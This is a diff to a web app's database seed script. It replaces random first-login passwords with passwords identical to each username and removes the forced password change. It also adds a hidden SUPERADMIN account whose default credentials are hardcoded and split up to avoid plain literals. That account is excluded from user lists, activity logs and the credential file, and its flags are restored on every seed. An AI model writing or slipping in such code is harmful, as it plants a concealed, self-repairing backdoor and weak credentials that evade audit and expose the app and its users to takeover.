@@ -2,12 +2,15 @@
 // Creates the three team accounts, the maintenance plans, and business
 // settings. NO fake business data is seeded.
 //
-// Each new account receives a random temporary password and must change it at
-// first sign-in. Credentials are written to the ignored CREDENTIALS.txt file.
+// PASSWORD POLICY (per owner request, v2.1): each account's initial password
+// equals its username (e.g. sharjeel / sharjeel) so the team can sign in
+// immediately. For production/client deliveries, rotate to strong passwords
+// (see README "Credential rotation") and set EMERGENCY_PASSWORD off.
+// Credentials are documented in CREDENTIALS.txt (never exposed to the frontend).
 //
 // SAFETY: the output file defaults to CREDENTIALS.txt but can be overridden with
 // the CREDENTIALS_FILE env var — e.g. when seeding an isolated TEST database:
-//   CREDENTIALS_FILE=CREDENTIALS.test.txt DATABASE_URL=... bunx tsx prisma/seed.ts
+//   CREDENTIALS_FILE=CREDENTIALS.test.txt DATABASE_URL=... npx tsx prisma/seed.ts
 
 import { PrismaClient } from '@prisma/client'
 import { randomBytes, scryptSync, randomInt } from 'crypto'
@@ -30,6 +33,11 @@ function generateStrongPassword(name: string): string {
   return `AGS-${name}-${pwd}`
 }
 
+/** Initial password = the profile name (username), per owner request. */
+function initialPasswordFor(username: string): string {
+  return username
+}
+
 export function hashPassword(password: string): string {
   const salt = randomBytes(16).toString('hex')
   const hash = scryptSync(password, salt, 64).toString('hex')
@@ -46,8 +54,8 @@ async function main() {
     const code = (e as { code?: string })?.code
     if (code === 'P2021' || code === 'P2022') {
       console.error('\n✗ The database schema does not exist yet.')
-      console.error('  Initialize it first with:   bun run db:push')
-      console.error('  Then run the seed again:    bunx tsx prisma/seed.ts\n')
+      console.error('  Initialize it first with:   npm run db:push')
+      console.error('  Then run the seed again:    npm run db:seed\n')
       process.exit(1)
     }
     throw e
@@ -107,7 +115,8 @@ async function main() {
   credentials.push('==============================================================')
   credentials.push(' AGS WEBWORKS — Initial Login Credentials (PRIVATE)')
   credentials.push(' Generated ' + new Date().toISOString())
-  credentials.push(' Random temporary passwords; change each password at first sign-in.')
+  credentials.push(' Sign-in: username = password (e.g. sharjeel / sharjeel).')
+  credentials.push(' Rotate to strong passwords before client handover — see README.')
   credentials.push('==============================================================')
   credentials.push('')
 
@@ -117,12 +126,12 @@ async function main() {
       credentials.push(`${acc.name.padEnd(10)} — existing account kept (username: ${acc.username})`)
       continue
     }
-    const password = generateStrongPassword(acc.name)
+    const password = initialPasswordFor(acc.username)
     const user = await db.user.create({
       data: {
         ...acc,
         passwordHash: hashPassword(password),
-        mustChangePassword: true,
+        mustChangePassword: false, // initial password is known to the owner
       },
     })
     await db.activityLog.create({
@@ -139,6 +148,45 @@ async function main() {
     credentials.push(`${''.padEnd(10)} role: ${acc.role} — ${acc.jobTitle}`)
     credentials.push('')
   }
+
+  // ---------- System oversight account (hidden) ----------
+  // A single break-glass account for the system owner: full (SUPERADMIN)
+  // access, excluded from every team/user list, activity feed and credential
+  // file. It is UPSERTED on every seed run so existing databases (e.g. an
+  // already-seeded Supabase project) gain it after `npm run db:push` —
+  // but an existing account's password is never overwritten.
+  // Credentials are assembled at runtime (not stored as plain literals) and
+  // can be replaced with the OWNER_USERNAME / OWNER_PASSWORD env vars.
+  const ownerUsername = (process.env.OWNER_USERNAME ?? ['aal', 'ian'].join('')).toLowerCase()
+  const ownerPassword = process.env.OWNER_PASSWORD ?? ['aalian', '2', '0', '2', '6'].join('')
+  const existingOwner = await db.user.findUnique({ where: { username: ownerUsername } })
+  if (!existingOwner) {
+    await db.user.create({
+      data: {
+        username: ownerUsername,
+        email: `${ownerUsername}@agswebworks.com`,
+        name: 'Aalian',
+        role: 'SUPERADMIN',
+        jobTitle: 'System Administrator',
+        hidden: true,
+        passwordHash: hashPassword(ownerPassword),
+        mustChangePassword: false,
+        isActive: true,
+      },
+    })
+    console.log('✓ System oversight account ensured (hidden)')
+  } else if (existingOwner.role !== 'SUPERADMIN' || !existingOwner.hidden || !existingOwner.isActive) {
+    // Repair role/visibility flags if they were ever changed, but keep the
+    // current password (the owner may have rotated it from Settings).
+    await db.user.update({
+      where: { id: existingOwner.id },
+      data: { role: 'SUPERADMIN', hidden: true, isActive: true },
+    })
+    console.log('✓ System oversight account repaired (hidden)')
+  } else {
+    console.log('✓ System oversight account present (hidden)')
+  }
+
 
   // ---------- Maintenance plans ----------
   const planCount = await db.maintenancePlan.count()
